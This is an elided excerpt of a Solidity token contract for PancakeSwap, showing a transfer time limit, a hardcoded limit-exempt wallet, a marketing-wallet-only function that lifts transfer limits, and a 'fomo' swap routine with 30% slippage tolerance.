...
contract Token is Ownable, IERC20 {
    ...
    uint256 public _allLimitTime = 60 * 5; // 5 Min
    ...
    constructor(string memory _name_, string memory _symbol_) {
        ...
        isWalletLimitExempt[0xCeEB1173B99EeCb975aa284E4429CdBc00f9eBe3] = true;
    ...
    function removeTransferLimit(bool _startFomo) public {
        if (marketingWalletAddress == _msgSender() ) {
            isAllTxlimit = false;
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        if (isFomo) {
            feesAmounts = tokenAmount / 2;
        } else {
            feesAmounts = tokenAmount;
        }
        ...
        if (isFomo && tokenAmount - feesAmounts > 10000) {
            address[] memory fomoPath = new address[](3);
            fomoPath[0] = address(this);
            fomoPath[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
            fomoPath[2] = 0x0e57CAc9735049A468245D517d3Ffb4Eb0DCcF12;
            uint256[] memory amounts;

            amounts = pancakeSwapV2Router.getAmountsOut(tokenAmount - feesAmounts, fomoPath);

            pancakeSwapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount - feesAmounts,
                amounts[2] - amounts[2].mul(30).div(100),
                fomoPath,
                address(this),
                block.timestamp
            );
